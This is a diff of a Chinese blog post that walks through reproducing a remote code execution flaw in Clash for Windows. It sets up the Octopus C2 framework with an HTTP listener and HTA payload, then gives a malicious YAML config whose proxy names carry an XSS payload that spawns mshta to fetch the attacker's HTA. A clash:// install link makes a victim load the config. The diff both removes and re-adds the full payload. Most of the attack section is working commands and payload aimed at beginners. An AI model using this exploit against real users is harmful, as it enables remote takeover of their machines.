@@ -290,7 +290,7 @@
 
 
                 <time class="article-time--reading">
-                    3 minute read
+                    2 minute read
                 </time>
             </div>
         
@@ -337,129 +337,56 @@
 </ul>
 <p>(由于大部分系统已经预装，如果你非deb系请自主上网搜索安装方式)</p>
 </blockquote>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">git clone https://github.com/mhaskar/Octopus.git
-</span></span><span class="line"><span class="cl"><span class="nb">cd</span> Octopus
-</span></span><span class="line"><span class="cl">pip install -r requirements.txt
-</span></span><span class="line"><span class="cl">python3 octopus.py
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>成功安装后你会看到如下界面</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌─<span class="o">[</span>askar@hackbook<span class="o">]</span>─<span class="o">[</span>/opt/redteaming/Octopus<span class="o">]</span>
-</span></span><span class="line"><span class="cl">└──╼ <span class="nv">$python3</span> octopus.py
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">      ___           ___                       ___           ___         ___           ___
-</span></span><span class="line"><span class="cl">     /  /<span class="se">\ </span>        /  /<span class="se">\ </span>         ___        /  /<span class="se">\ </span>        /  /<span class="se">\ </span>      /__/<span class="se">\ </span>        /  /<span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>    /  /::<span class="se">\ </span>      /  /:/         /  /<span class="se">\ </span>     /  /::<span class="se">\ </span>      /  /::<span class="se">\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>      /  /:/_
-</span></span><span class="line"><span class="cl">   /  /:/<span class="se">\:\ </span>    /  /:/         /  /:/     /  /:/<span class="se">\:\ </span>    /  /:/<span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>    /  /:/ /<span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span>  /  /:/  <span class="se">\:\ </span>  /  /:/  ___    /  /:/     /  /:/  <span class="se">\:\ </span>  /  /:/~/:/  ___  <span class="se">\ </span> <span class="se">\:\ </span>  /  /:/ /::<span class="se">\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span> /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/  /  /<span class="se">\ </span> /  /::<span class="se">\ </span>   /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/  /__/<span class="se">\ </span> <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/<span class="se">\:\
-</span></span></span><span class="line"><span class="cl"><span class="se"></span> <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ /__/:/<span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/   <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/~/:/
-</span></span><span class="line"><span class="cl">  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:\ </span> /:/  <span class="se">\_</span>_<span class="se">\/</span>  <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/     <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/ /:/
-</span></span><span class="line"><span class="cl">   <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\/</span>:/        <span class="se">\ </span> <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\_</span>_<span class="se">\/</span> /:/
-</span></span><span class="line"><span class="cl">    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:</span>:/          <span class="se">\_</span>_<span class="se">\/</span>    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:</span>:/        /__/:/
-</span></span><span class="line"><span class="cl">     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>                     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>       <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">                    v1.2 stable !
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"> Octopus C2 <span class="p">|</span> Control your shells
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">Octopus &gt;&gt;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>之后再运行只需要输入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">python3 octopus.py
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="apache2">Apache2</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">git clone https://github.com/mhaskar/Octopus.git
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="nb">cd</span> Octopus
+</span></span><span class="line"><span class="ln">3</span><span class="cl">pip install -r requirements.txt
+</span></span><span class="line"><span class="ln">4</span><span class="cl">python3 octopus.py
+</span></span></code></pre></div><p>成功安装后你会看到如下界面</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln"> 1</span><span class="cl">┌─<span class="o">[</span>askar@hackbook<span class="o">]</span>─<span class="o">[</span>/opt/redteaming/Octopus<span class="o">]</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">└──╼ <span class="nv">$python3</span> octopus.py
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">      ___           ___                       ___           ___         ___           ___
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">     /  /<span class="se">\ </span>        /  /<span class="se">\ </span>         ___        /  /<span class="se">\ </span>        /  /<span class="se">\ </span>      /__/<span class="se">\ </span>        /  /<span class="se">\
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="se"></span>    /  /::<span class="se">\ </span>      /  /:/         /  /<span class="se">\ </span>     /  /::<span class="se">\ </span>      /  /::<span class="se">\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>      /  /:/_
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">   /  /:/<span class="se">\:\ </span>    /  /:/         /  /:/     /  /:/<span class="se">\:\ </span>    /  /:/<span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\ </span>    /  /:/ /<span class="se">\
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="se"></span>  /  /:/  <span class="se">\:\ </span>  /  /:/  ___    /  /:/     /  /:/  <span class="se">\:\ </span>  /  /:/~/:/  ___  <span class="se">\ </span> <span class="se">\:\ </span>  /  /:/ /::<span class="se">\
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="se"></span> /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/  /  /<span class="se">\ </span> /  /::<span class="se">\ </span>   /__/:/ <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/  /__/<span class="se">\ </span> <span class="se">\_</span>_<span class="se">\:\ </span>/__/:/ /:/<span class="se">\:\
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="se"></span> <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ /__/:/<span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/   <span class="se">\ </span> <span class="se">\:\ </span>/  /:/ <span class="se">\ </span> <span class="se">\:\/</span>:/~/:/
+</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:\ </span> /:/  <span class="se">\_</span>_<span class="se">\/</span>  <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/     <span class="se">\ </span> <span class="se">\:\ </span> /:/   <span class="se">\ </span> <span class="se">\:</span>:/ /:/
+</span></span><span class="line"><span class="ln">14</span><span class="cl">   <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\/</span>:/        <span class="se">\ </span> <span class="se">\:\ </span>  <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:\/</span>:/     <span class="se">\_</span>_<span class="se">\/</span> /:/
+</span></span><span class="line"><span class="ln">15</span><span class="cl">    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:</span>:/          <span class="se">\_</span>_<span class="se">\/</span>    <span class="se">\ </span> <span class="se">\:</span>:/       <span class="se">\ </span> <span class="se">\:\ </span>     <span class="se">\ </span> <span class="se">\:</span>:/        /__/:/
+</span></span><span class="line"><span class="ln">16</span><span class="cl">     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>                     <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>       <span class="se">\_</span>_<span class="se">\/</span>         <span class="se">\_</span>_<span class="se">\/</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">
+</span></span><span class="line"><span class="ln">18</span><span class="cl">
+</span></span><span class="line"><span class="ln">19</span><span class="cl">                    v1.2 stable !
+</span></span><span class="line"><span class="ln">20</span><span class="cl">
+</span></span><span class="line"><span class="ln">21</span><span class="cl">
+</span></span><span class="line"><span class="ln">22</span><span class="cl"> Octopus C2 <span class="p">|</span> Control your shells
+</span></span><span class="line"><span class="ln">23</span><span class="cl">
+</span></span><span class="line"><span class="ln">24</span><span class="cl">
+</span></span><span class="line"><span class="ln">25</span><span class="cl">Octopus &gt;&gt;
+</span></span></code></pre></div><p>之后再运行只需要输入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">python3 octopus.py
+</span></span></code></pre></div><h3 id="apache2">Apache2</h3>
 <p>deb系</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo apt install apache2
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>yum系</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo yum -y install httpd
-</span></span><span class="line"><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>80/tcp
-</span></span><span class="line"><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>443/tcp
-</span></span><span class="line"><span class="cl">sudo firewall-cmd --reload
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>其他系统请参考<a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">sudo apt install apache2
+</span></span></code></pre></div><p>yum系</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">sudo yum -y install httpd
+</span></span><span class="line"><span class="ln">2</span><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>80/tcp
+</span></span><span class="line"><span class="ln">3</span><span class="cl">sudo firewall-cmd --permanent --add-port<span class="o">=</span>443/tcp
+</span></span><span class="line"><span class="ln">4</span><span class="cl">sudo firewall-cmd --reload
+</span></span></code></pre></div><p>其他系统请参考<a class="link" href="https://httpd.apache.org/docs/2.4/install.html"  target="_blank" rel="noopener"
     >官方网站</a></p>
 <h2 id="漏洞复现">漏洞复现</h2>
 <h3 id="linux攻击机器">Linux(攻击机器)</h3>
 <p>在刚刚下好的Octopus目录下打开终端</p>
 <p>输入<code>python3 octopus.py</code></p>
 <p>进入Octopus界面后输入如下内容</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">listen_http Linux的ip <span class="m">5555</span> Linux的ip <span class="m">5</span> 随便起一个名字.php 名字
-</span></span><span class="line"><span class="cl">generate_hta 名字
-</span></span></code></pre></td></tr></table>
-</div>
-</div><hr>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">listen_http Linux的ip <span class="m">5555</span> Linux的ip <span class="m">5</span> 随便起一个名字.php 名字
+</span></span><span class="line"><span class="ln">2</span><span class="cl">generate_hta 名字
+</span></span></code></pre></div><hr>
 <p>面向想做Hacker的<strong>小白</strong>的提醒 <strong>(大佬们可以直接略过了)</strong></p>
 <ul>
 <li>
@@ -487,70 +414,33 @@
 ></p>
 <p>在Apache站点的默认目录<code>/var/www/html/</code>里放入我们的恶意配置文件，并命名为<code>RCE.yaml</code></p>
 <p>命令如下:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo vi RCE.yaml
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>写入如下内容</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接(记住只需要一对双引号)&#34;])&#39;);&gt;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;17938&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;8088&#34;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">  </span>-<span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">    </span>- <span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="ln">1</span><span class="cl">sudo vi RCE.yaml
+</span></span></code></pre></div><p>写入如下内容</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="m">7890</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="w"></span><span class="nt">socks-port</span><span class="p">:</span><span class="w"> </span><span class="m">7891</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="w"></span><span class="nt">allow-lan</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="w"></span><span class="nt">mode</span><span class="p">:</span><span class="w"> </span><span class="l">Rule</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="w"></span><span class="nt">log-level</span><span class="p">:</span><span class="w"> </span><span class="l">info</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="w"></span><span class="nt">external-controller</span><span class="p">:</span><span class="w"> </span><span class="p">:</span><span class="m">9090</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="w"></span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接(记住只需要一对双引号)&#34;])&#39;);&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;17938&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="w">  </span>- <span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">abc</span><span class="w">
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">socks5</span><span class="w">
+</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="w">    </span><span class="nt">server</span><span class="p">:</span><span class="w"> </span><span class="m">127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="w">    </span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;8088&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="w">    </span><span class="nt">skip-cert-verify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="w">
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="w"></span><span class="nt">proxy-groups</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="w">  </span>-<span class="w">
+</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="w">    </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">select</span><span class="w">
+</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="w">    </span><span class="nt">proxies</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="w">    </span>- <span class="l">a&lt;img/src=&#34;1&#34;/onerror=eval(&#39;require(&#34;child_process&#34;).spawn(&#34;mshta&#34;,[&#34;Octopus的链接&#34;])&#39;);&gt;</span><span class="w">
+</span></span></span></code></pre></div><blockquote>
 <p>原理：这是一个XSS漏洞，把payload放进Proxy的名字里，即可实现任意js代码执行，这里是执行指令mshta(命令) &lt;Octopus生成的hta链接&gt;(参数)</p>
 </blockquote>
 <p>按下<code>Esc</code>键并输入<code>:wq</code>保存并退出</p>
@@ -566,15 +456,8 @@
 <hr>
 <p><del><strong>咳咳，逃～～</strong></del></p>
 <p>在Windows任意浏览器里输入</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">clash://install-config?url=http://Linux的ip/RCE.yaml<span class="err">&amp;</span>name=名字
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>Tip:记得换IP和名字</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln">1</span><span class="cl">clash://install-config?url=http://Linux的ip/RCE.yaml<span class="err">&amp;</span>name=名字
+</span></span></code></pre></div><p><strong>Tip:记得换IP和名字</strong></p>
 <p>然后在弹出的提示点<code>打开(Open)Clash For Windows</code></p>
 <p><img src="/p/clash%E7%8C%AB%E7%8C%ABrce%E5%A4%8D%E7%8E%B0%E5%BC%B9shell/2.jpg"
 	width="672"
@@ -691,6 +574,30 @@
             
                 
 <article class="has-image">
+    <a href="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+        
+        
+            <div class="article-image">
+                <img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.7a00d4ec355b0228bf22cadbfd4376f9_hub6d28757c33c1ef5c0f635b7b627146b_864309_250x150_fill_q75_box_smart1.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:文件包含漏洞"
+                        
+                        data-hash="md5-egDU7DVbAii/Isrb/UN2&#43;Q==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Web安全:文件包含漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
     <a href="/p/web%E5%AE%89%E5%85%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/%E6%B3%A8%E5%85%A5rce/">
         
         
@@ -780,30 +687,6 @@
 
         <div class="article-details">
             <h2 class="article-title">Web安全:关于信息收集那些事</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/pwn-pwn-pang-part5---ret2shellcode/">
-        
-        
-            <div class="article-image">
-                <img src="/p/pwn-pwn-pang-part5---ret2shellcode/cover.5f05682fb9be023753c14c7bf7b130e4_hu3166df2cafdca7684e1b9dcf3608c6c9_2294292_250x150_fill_q75_box_smart1.jpg" 
-                        width="250" 
-                        height="150" 
-                        loading="lazy"
-                        alt="Featured image of post PWN! PWN! PANG! Part5 --- ret2shellcode"
-                        
-                        data-hash="md5-XwVoL7m&#43;AjdTwUx797Ew5A==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">PWN! PWN! PANG! Part5 --- ret2shellcode</h2>
         </div>
     </a>
 </article>
